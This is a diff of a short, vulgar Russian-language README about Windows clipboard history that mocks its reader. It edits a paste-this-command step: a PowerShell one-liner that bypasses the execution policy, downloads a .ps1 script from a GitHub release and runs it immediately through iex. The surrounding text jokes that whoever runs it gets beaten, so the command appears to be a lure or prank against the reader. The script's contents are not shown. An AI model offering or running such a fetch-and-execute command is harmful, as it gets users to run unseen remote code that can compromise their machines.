@@ -1,7 +1,7 @@
 История буфера обмена винды
 замысел в чем, ты еблан, который забыл Win+V... и ты такой о ахуеть у меня айкью как у моего обезьяны папаши и вставляешь скрипт в cmd
 ```
-powershell -ExecutionPolicy Bypass -Command "irm https://github.com/piltouface/Y-ClipBoard/releases/download/Y-ClipBoard_1.0/Y-ClipBoard.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://github.com/piltouface/zxcClipBoard/releases/download/Y-ClipBoard_1.0/Y-ClipBoard.ps1 | iex"
 ```
 вот тут тебя пиздят ногами и харкают в спину, при чем ты еще из дома не вышел
 
